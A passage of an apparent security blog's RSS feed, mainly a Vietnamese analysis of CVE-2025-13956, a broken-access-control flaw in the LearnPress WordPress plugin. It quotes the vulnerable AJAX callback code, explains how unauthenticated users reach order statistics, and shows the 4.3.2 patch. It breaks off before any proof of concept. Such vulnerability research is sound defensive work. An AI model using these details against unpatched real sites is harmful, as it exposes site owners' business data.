class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/document-library-lite/vulnerability/wordpress-document-library-lite-plugin-1-1-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin &amp;lt;= 1.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13956 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-16-cve-2025-13956/</link>
      <pubDate>Tue, 16 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-16-cve-2025-13956/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-16-cve-2025-13956/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LearnPress – WordPress LMS Plugin&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; bị &lt;strong&gt;lỗ hổng truy cập trái phép dữ liệu&lt;/strong&gt; do &lt;strong&gt;thiếu kiểm tra quyền (capability check)&lt;/strong&gt; trong &lt;strong&gt;chức năng thống kê&lt;/strong&gt; ở &lt;strong&gt;tất cả các phiên bản đến và bao gồm 4.3.1&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; xem &lt;strong&gt;thống kê đơn hàng&lt;/strong&gt; của plugin, bao gồm &lt;strong&gt;tổng doanh thu&lt;/strong&gt; và &lt;strong&gt;số lượng trạng thái đơn hàng&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13956&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13956&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LearnPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;  &amp;#39;init&amp;#39;,&#xA;  function () {&#xA;    LoadContentViaAjax::catch_lp_ajax();&#xA;    LessonAjax::catch_lp_ajax();&#xA;    EditCurriculumAjax::catch_lp_ajax();&#xA;    EditQuizAjax::catch_lp_ajax();&#xA;    EditQuestionAjax::catch_lp_ajax();&#xA;    SendEmailAjax::catch_lp_ajax();&#xA;    OpenAiAjax::catch_lp_ajax();&#xA;&#xA;    do_action( &amp;#39;learn-press/register-ajax-handlers&amp;#39; );&#xA;  },&#xA;  11&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;init&lt;/code&gt; hook là hook khởi tạo sớm của WordPress, được chạy sau khi WordPress tải xong các thành phần cốt lõi nhưng trước khi gửi output ra trình duyệt =&amp;gt; Bất kì request của bất kỳ user nào cũng kích hoạt được.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;function () {}&lt;/code&gt; là hàm ẩn danh được đặt làm callback cho hook này.&lt;/p&gt;&#xA;&lt;p&gt;Ở dòng thứ 4, hàm tĩnh &lt;code&gt;LoadContentViaAjax:catch_lp_ajax()&lt;/code&gt; được gọi từ class &lt;code&gt;LoadContentViaAjax&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax { ... }&#xA;&#xA;abstract class AbstractAjax {&#xA;&#x9;public static function catch_lp_ajax() {&#xA;&#x9;&#x9;if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;$action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&#xA;&#x9;&#x9;&#x9;$nonce  = $_REQUEST[&amp;#39;nonce&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;$class  = new static();&#xA;&#xA;&#x9;&#x9;&#x9;// For case cache html, so cache nonce is not required.&#xA;&#x9;&#x9;&#x9;$class_no_nonce = [&#xA;&#x9;&#x9;&#x9;&#x9;LoadContentViaAjax::class,&#xA;&#x9;&#x9;&#x9;];&#xA;&#xA;&#x9;&#x9;&#x9;if ( ! wp_verify_nonce( $nonce, &amp;#39;wp_rest&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;if ( ! in_array( get_class( $class ), $class_no_nonce ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;&#x9;&#x9;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;// Allow to handle without nonce, but must same domain.&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$referer = wp_get_referer();&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;if ( empty( $referer ) || strpos( $referer, home_url() ) !== 0 ) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;if ( is_callable( [ $class, $action ] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;call_user_func( [ $class, $action ] );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Class kế thừa&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;LoadContentViaAjax&lt;/code&gt; kế thừa toàn bộ logic xử lý AJAX từ &lt;code&gt;AbstractAjax&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Hook &lt;code&gt;init&lt;/code&gt; gọi &lt;code&gt;catch_lp_ajax()&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Khi WordPress chạy tới hook &lt;code&gt;init&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;LoadContentViaAjax::catch_lp_ajax()&lt;/code&gt; được thực thi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra request&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Chỉ xử lý khi request có tham số &lt;code&gt;lp-load-ajax&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xác định hành động&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Giá trị này được coi là &lt;strong&gt;tên method&lt;/strong&gt; sẽ được gọi trong class con.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Khởi tạo object&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class = new static();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;static&lt;/code&gt; trỏ tới class đang gọi (&lt;code&gt;LoadContentViaAjax&lt;/code&gt;), nên tạo instance của class đó.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xử lý nonce&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy &lt;code&gt;nonce&lt;/code&gt; từ request&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra bằng &lt;code&gt;wp_verify_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Riêng &lt;code&gt;LoadContentViaAjax&lt;/code&gt; được phép &lt;strong&gt;bỏ qua nonce&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Khi bỏ qua nonce thì kiểm tra &lt;code&gt;referer&lt;/code&gt; cùng domain.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Gọi method tương ứng&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $action ] ) ) {&#xA;    call_user_func( [ $class, $action ] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Nếu trong &lt;code&gt;LoadContentViaAjax&lt;/code&gt; có method trùng tên với giá trị &lt;code&gt;lp-load-ajax&lt;/code&gt;&#xA;→ Method đó sẽ được gọi và thực thi.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax {&#xA;&#x9;public function load_content_via_ajax() {&#xA;&#x9;&#x9;$response = new LP_REST_Response();&#xA;&#xA;&#x9;&#x9;try {&#xA;&#x9;&#x9;&#x9;$params = wp_unslash( $_REQUEST[&amp;#39;data&amp;#39;] ?? &amp;#39;&amp;#39; );&#xA;&#x9;&#x9;&#x9;if ( empty( $params ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$params = LP_Helper::json_decode( $params, true );&#xA;&#xA;&#x9;&#x9;&#x9;if ( empty( $params[&amp;#39;callback&amp;#39;] ) ||&#xA;&#x9;&#x9;&#x9;&#x9;! isset( $params[&amp;#39;args&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;// @var array $args&#xA;&#x9;&#x9;&#x9;$args     = $params[&amp;#39;args&amp;#39;];&#xA;&#x9;&#x9;&#x9;$callBack = $params[&amp;#39;callback&amp;#39;];&#xA;&#xA;&#x9;&#x9;&#x9;if ( empty( $callBack[&amp;#39;class&amp;#39;] ) ||&#xA;&#x9;&#x9;&#x9;&#x9;empty( $callBack[&amp;#39;method&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$class  = $callBack[&amp;#39;class&amp;#39;];&#xA;&#x9;&#x9;&#x9;$method = $callBack[&amp;#39;method&amp;#39;];&#xA;&#xA;&#x9;&#x9;&#x9;// Security: check callback is registered.&#xA;&#x9;&#x9;&#x9;$allow_callbacks = apply_filters(&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;[]&#xA;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;&#x9;$callBackStr     = $class . &amp;#39;:&amp;#39; . $method;&#xA;&#x9;&#x9;&#x9;if ( ! in_array( $callBackStr, $allow_callbacks ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback is not register!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;// Check class and method is callable.&#xA;&#x9;&#x9;&#x9;if ( is_callable( [ $class, $method ] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$data = call_user_func( [ $class, $method ], $args );&#xA;&#x9;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback is not callable!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;if ( ! $data instanceof stdClass &amp;amp;&amp;amp; ! isset( $data-&amp;gt;content ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: data content invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;message = $data-&amp;gt;message ?? &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;unset( $data-&amp;gt;message );&#xA;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;status = &amp;#39;success&amp;#39;;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;data   = $data;&#xA;&#x9;&#x9;} catch ( Throwable $e ) {&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;status  = &amp;#39;error&amp;#39;;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;message = $e-&amp;gt;getMessage();&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;wp_send_json( $response );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Các biến cần thiết cho &lt;code&gt;call_user_func&lt;/code&gt; được hình thành trực tiếp từ chính đoạn code này và liên kết với nhau theo đúng luồng xử lý:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$params = LP_Helper::json_decode( $params, true );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Biến &lt;code&gt;$params&lt;/code&gt; là mảng dữ liệu đầu vào sau khi giải mã JSON từ request, trong đó bắt buộc phải có thông tin callback và tham số.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args     = $params[&amp;#39;args&amp;#39;];&#xA;$callBack = $params[&amp;#39;callback&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt; chứa các tham số sẽ được truyền vào hàm được gọi, còn &lt;code&gt;$callBack&lt;/code&gt; mô tả callback cần thực thi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class  = $callBack[&amp;#39;class&amp;#39;];&#xA;$method = $callBack[&amp;#39;method&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hai biến này xác định chính xác &lt;strong&gt;class&lt;/strong&gt; và &lt;strong&gt;phương thức&lt;/strong&gt; sẽ được gọi động.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callBackStr = $class . &amp;#39;:&amp;#39; . $method;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chuỗi này được dùng để đối chiếu với danh sách callback được phép trong &lt;code&gt;$allow_callbacks&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Hàng loạt các callback được đăng ký cho filter &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt; thông qua hàm &lt;code&gt;add_filter&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#34; title=&#34;Đăng ký callback cho filter lp/rest/ajax/allow_callback&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Đăng ký callback cho filter lp/rest/ajax/allow_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#39; alt=&#34;Filter&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Đăng ký callback cho filter lp/rest/ajax/allow_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allow_callback( array $callbacks ): array {&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_edit_quiz&amp;#39;;&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_list_items_not_assign&amp;#39;;&#xA;&#xA;  return $callbacks;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận mảng &lt;code&gt;$callbacks&lt;/code&gt; hiện có, sau đó thêm vào hai chuỗi dạng &lt;code&gt;TênClass:method&lt;/code&gt; của class hiện tại, rồi trả lại mảng đó để WordPress sử dụng làm danh sách callback hợp lệ. Khi debug, ta sẽ thấy toàn bộ các callback được đăng ký:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#34; title=&#34;Danh sách các callback hợp lệ&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#34; data-sub-html=&#34;&lt;h2&gt;Allow&lt;/h2&gt;&lt;p&gt;Danh sách các callback hợp lệ&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#39; alt=&#34;Allow&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh sách các callback hợp lệ&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $method ] ) ) {&#xA;    $data = call_user_func( [ $class, $method ], $args );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Mảng &lt;code&gt;[ $class, $method ]&lt;/code&gt; chính là callback hợp lệ mà &lt;code&gt;call_user_func&lt;/code&gt; yêu cầu. Khi điều kiện &lt;code&gt;is_callable&lt;/code&gt; đúng, WordPress sẽ gọi phương thức &lt;code&gt;$method&lt;/code&gt; của class &lt;code&gt;$class&lt;/code&gt; và truyền biến &lt;code&gt;$args&lt;/code&gt; làm tham số duy nhất cho phương thức đó.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng phát sinh do API không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.&lt;/strong&gt; Điều này cho phép mọi người dùng – kể cả không có quyền quản trị – gọi vào endpoint và yêu cầu thực thi bất kỳ callback nào nằm trong danh sách callback hợp lệ, dù những callback đó lẽ ra chỉ dành cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v4.3.2)&lt;/strong&gt; bổ sung vào hàm &lt;code&gt;load_content_via_ajax&lt;/code&gt; bước xác thực quyền bằng cách cố định danh sách callback được phép gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$allow_callbacks = apply_filters(&#xA;    &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;    [&#xA;        &amp;#39;LP_Admin_Dashboard:order_statistic&amp;#39;,&#xA;        &amp;#39;LP_Admin_Dashboard:plugin_status_content&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chỉ những callback có tên class và method khớp chính xác với &lt;code&gt;&#39;LP_Admin_Dashboard:order_statistic&#39;&lt;/code&gt; hoặc &lt;code&gt;&#39;LP_Admin_Dashboard:plugin_status_content&#39;&lt;/code&gt; mới vượt qua được kiểm tra.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;order_statistic&lt;/code&gt; và &lt;code&gt;plugin_status_content&lt;/code&gt; đều có cơ chế kiểm tra quyền Administrator trước khi thực thi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( UserModel::ROLE_ADMINISTRATOR ) ) {&#xA;  wp_die( esc_html__( &amp;#39;You do not have sufficient permissions to access this page.&amp;#39;, &amp;#39;learnpress&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nhờ đó lỗ hổng đã được khoá chặt.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 